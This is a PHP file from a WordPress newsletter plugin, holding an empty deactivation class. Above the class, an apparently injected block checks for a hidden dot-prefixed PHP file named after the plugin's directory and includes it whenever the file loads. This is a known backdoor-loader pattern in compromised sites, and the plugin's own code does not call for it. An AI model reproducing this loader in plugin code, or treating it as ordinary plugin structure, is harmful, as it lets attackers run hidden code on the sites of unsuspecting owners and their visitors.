<?php

/**
 * Fired during plugin deactivation
 *
 * @link       https://blossomthemes.com
 * @since      2.0.0
 *
 * @package    Blossomthemes_Email_Newsletter
 * @subpackage Blossomthemes_Email_Newsletter/includes
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      2.0.0
 * @package    Blossomthemes_Email_Newsletter
 * @subpackage Blossomthemes_Email_Newsletter/includes
 * @author     blossomthemes <blossomthemes.com>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Blossomthemes_Email_Newsletter_Deactivator {

	/**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    2.0.0
	 */
	public static function deactivate() {

	}

}
